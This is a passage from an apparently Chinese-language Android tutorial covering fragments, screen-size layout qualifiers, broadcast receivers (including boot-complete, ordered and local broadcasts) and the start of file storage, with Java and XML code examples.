&#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.another_right_fragment,container,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;FrameLayout</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_layout&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>main.java如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        replaceFragment(<span class="keyword">new</span> <span class="title class_">RightFragment</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.button:</span><br><span class="line">                replaceFragment(<span class="keyword">new</span> <span class="title class_">AnotherRightFragment</span>());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">replaceFragment</span><span class="params">(Fragment fragment)</span> &#123;</span><br><span class="line">        <span class="type">FragmentManager</span> <span class="variable">fragmentManager</span> <span class="operator">=</span> getSupportFragmentManager();</span><br><span class="line">        <span class="type">FragmentTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> fragmentManager.beginTransaction();</span><br><span class="line">        transaction.replace(R.id.right_layout, fragment);</span><br><span class="line">        transaction.addToBackStack(<span class="literal">null</span>);</span><br><span class="line">        transaction.commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="碎片中模拟返回栈">碎片中模拟返回栈</h4><p>通过点击按钮添加碎片后，按Back键程序自动退出，如果模拟类似返回栈效果，如下</p><p>在FragmentTransaction提供的addToBackStack()，用于将一个事务添加到返回栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">replaceFragment</span><span class="params">(Fragment fragment)</span> &#123;</span><br><span class="line">        <span class="type">FragmentManager</span> <span class="variable">fragmentManager</span> <span class="operator">=</span> getSupportFragmentManager();</span><br><span class="line">        <span class="type">FragmentTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> fragmentManager.beginTransaction();</span><br><span class="line">        transaction.replace(R.id.right_layout, fragment);</span><br><span class="line">    </span><br><span class="line">        transaction.addToBackStack(<span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">        transaction.commit();</span><br></pre></td></tr></table></figure><h4 id="碎片和活动进行通信">碎片和活动进行通信</h4><p><strong>活动与碎片通信</strong></p><p>获得碎片实例,就可以调用碎片里的方法</p><p><code>RightFragment rightFragment=getFragmentManager().findFragmentById(R.id.right_fragment);</code></p><p><strong>碎片与活动通信</strong></p><p>获得与碎片关联的活动实例</p><p>MainActivity activity = (MainActivity) getActivity();</p><h4 id="动态加载布局技巧">动态加载布局技巧</h4><p>实现 程序可以根据设备的分辨率或者屏幕大小在运行时来决定加载那个布局</p><h5 id="使用限定符">使用限定符</h5><p>修改FragmentTest项目的activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>在res文件夹下新建layout-large文件夹，里面新建activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.RightFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>上面那个文件夹的<code>large</code>就是限定符，小屏幕加载layout下布局 大屏幕加载layout-large下布局</p><p><img src="assets/image-20240725103301782.png" alt="image-20240725103301782"></p><p><img src="assets/image-20240725103310000.png" alt="image-20240725103310000"></p><h5 id="使用最小限定符">使用最小限定符</h5><p>新建layout-sw600dp文件夹，下面新建activity_main.xml布局</p><p>当程序运行在屏幕宽度大于600dp时 加载layout-sw600dp文件夹下布局，反则正常加载。</p><h3 id="广播接受者">广播接受者</h3><p><strong>标准广播</strong> （Normal broadcasts）是一种完全异步执行的广播，在广播发出之后，所有的广播接收器几乎都会在同一时刻接收到这条广播消息，因此它们之间没有任何先后顺序可言。这种广播的效率会比较高，但同时也意味着它是无法被截断的。</p><p><strong>有序广播</strong> （Ordered broadcasts）则是一种同步执行的广播，在广播发出之后，同一时刻只会有一个广播接收器能够收到这条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。所以此时的广播接收器是有先后顺序的，优先级高的广播接收器就可以先收到广播消息，并且前面的广播接收器还可以截断正在传递的广播，这样后面的广播接收器就无法收到广播消息了。</p><p><strong>接收系统广播</strong></p><h5 id="动态注册监听网络变化">动态注册监听网络变化</h5><p>新建一个类，让它继承自<code>BroadcastReceiver</code> ，并重写父类的<code>onReceive()</code> 方法。当有广播到来时，<code>onReceive()</code> 方法就会得到执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> NetworkChangeReceiver networkChangeReceiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 创建一个intent过滤器</span></span><br><span class="line">        intentFilter = <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        <span class="comment">// 添加想要接收的intent请求</span></span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span>);</span><br><span class="line">        <span class="comment">// 实例化 Receiver类</span></span><br><span class="line">        networkChangeReceiver = <span class="keyword">new</span> <span class="title class_">NetworkChangeReceiver</span>();</span><br><span class="line">        <span class="comment">// 动态注册广播接收者</span></span><br><span class="line">        registerReceiver(networkChangeReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        <span class="comment">// 取消注册广播接收者</span></span><br><span class="line">        unregisterReceiver(networkChangeReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="comment">// 当收到广播时，弹窗提示网络状态改变</span></span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;network changes&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者当网络状态改变时，提示当前有网络还是无网络</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="comment">// 得到ConnectivityManager实例(一个系统服务类，专门用于管理网络连接)</span></span><br><span class="line">            <span class="type">ConnectivityManager</span> <span class="variable">connectionManager</span> <span class="operator">=</span> (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);</span><br><span class="line">            <span class="comment">// 得到NetworkInfo的实例</span></span><br><span class="line">            <span class="type">NetworkInfo</span> <span class="variable">networkInfo</span> <span class="operator">=</span> connectionManager.getActiveNetworkInfo();</span><br><span class="line">            <span class="comment">// 通过调用NetworkInfo的isAvailable()方法，来判断出当前有无网络</span></span><br><span class="line">            <span class="keyword">if</span> (networkInfo != <span class="literal">null</span> &amp;&amp; networkInfo.isAvailable()) &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is available&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is unavailable&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时，访问网络状态需要在<code>AndroidManifest.xml</code>中声明权限</p><h5 id="静态注册实现开机启动提醒">静态注册实现开机启动提醒</h5><p>需要在<code>AndroidManifest.xml</code>中注册receiver</p><p><receiver    android:name=".BootCompleteReceiver"    android:enabled="true"    android:exported="true"><br><intent-filter><br><!-- 开机事件广播 --><br><action android:name="android.intent.action.BOOT_COMPLETED" /><br></intent-filter><br></receiver></p><p>同时需要添加相应监听开机的权限</p><p>之后便可以添加一个Receiver.java，并在<code>onReceive()</code>中编写相应控制逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BootCompleteReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;Boot Complete&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不要在<code>onReceive()</code> 方法中添加过多的逻辑或者进行任何的耗时操作，因为在广播接收器中是不允许开启线程的，当<code>onReceive()</code> 方法运行了较长时间而没有结束时，程序就会报错。</p><h5 id="发送自定义广播">发送自定义广播</h5><p>发送标准广播</p><p>定义一个自己的广播接收器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>, Toast.LENGTH_</span><br><span class="line">            SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接收一个值为<code>com.example.broadcasttest.MY_BROADCAST</code>的广播</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setAction(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    intent.setPackage(<span class="string">&quot;com.example.broadcasttest&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于广播是使用Intent进行传递的，因此你还可以在Intent中携带一些数据传递给广播接收器。</p><p>发送有序广播</p><p>发送时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendOrderedBroadcast(intent, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接收时，通过<code>android.priority</code>属性来设置优先级</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同时通过<code>abortBroadcast()</code>方法来截断广播（之后的广播接收器无法收到）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>,</span><br><span class="line">        Toast.LENGTH_SHORT).show();</span><br><span class="line">    abortBroadcast();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用本地广播">使用本地广播</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> LocalReceiver localReceiver;</span><br><span class="line">    <span class="keyword">private</span> LocalBroadcastManager localBroadcastManager;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        localBroadcastManager = LocalBroadcastManager.getInstance(<span class="built_in">this</span>); <span class="comment">// 获取实例</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">                localBroadcastManager.sendBroadcast(intent); <span class="comment">// 发送本地广播</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        intentFilter = <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;com.example.broadcasttest.LOCAL_BROADCAST&quot;</span>);</span><br><span class="line">        localReceiver = <span class="keyword">new</span> <span class="title class_">LocalReceiver</span>();</span><br><span class="line">        localBroadcastManager.registerReceiver(localReceiver, intentFilter); <span class="comment">// 注</span></span><br><span class="line">        册本地广播监听器</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        localBroadcastManager.unregisterReceiver(localReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">LocalReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;received local broadcast&quot;</span>, Toast.LENGTH_SHORT).</span><br><span class="line"></span><br><span class="line">               show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与动态注册广播接收器一样，不过现在是通过LocalBroadcastManager的getInstance() 方法得到了它的一个实例，然后在注册广播接收器的时候调用的是LocalBroadcastManager的registerReceiver() 方法，在发送广播的时候调用的是LocalBroadcastManager的sendBroadcast() 方法</p><p><strong>本地广播是无法通过静态注册的方式来接收</strong></p><h2 id="数据存储">数据存储</h2><h3 id="文件存储">文件存储</h3><ul><li><p>Context 类中提供了一个openFileOutput() 方法，可以用于将数据存储到指定的文件中。</p></li><li><p>第一个参数为文件名（默认存储到/data/data/<package name>/files/目录下）</p></li><li><p>第二个参数是文件的操作模式，主要有两种模式可选，MODE_PRIVATE和MODE_APPEND。其中MODE_PRIVATE是默认的操作模式，表示当指定同样文件名的时候，所写入的内容将会覆盖原文件中的内容，而MODE_APPEND则表示如果该文件已存在，就往文件里面追加内容，不存在就创建新文件。</p></li><li><p>返回的是一个FileOutputStream 对象</p></li><li><p>Context 类中还提供了一个openFileInput() 方法，用于从文件中读取数据。</p></li><li><p>只接收一个参数，即要读取的文件名</p></li></ul><h4 id="数据存储文件中">数据存储文件中</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">        String data=<span class="string">&quot;Data to save&quot;</span>;</span><br><span class="line">        FileOutputStream out=<span class="literal">null</span>;</span><br><span class="line">        BufferedWriter writer=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            out=openFileOutput(<span class="string">&quot;data&quot;</span>, Context.MODE_PRIVATE);</span><br><span class="line">            writer=<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(out));</span><br><span class="line">            writer.write(data);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;                                          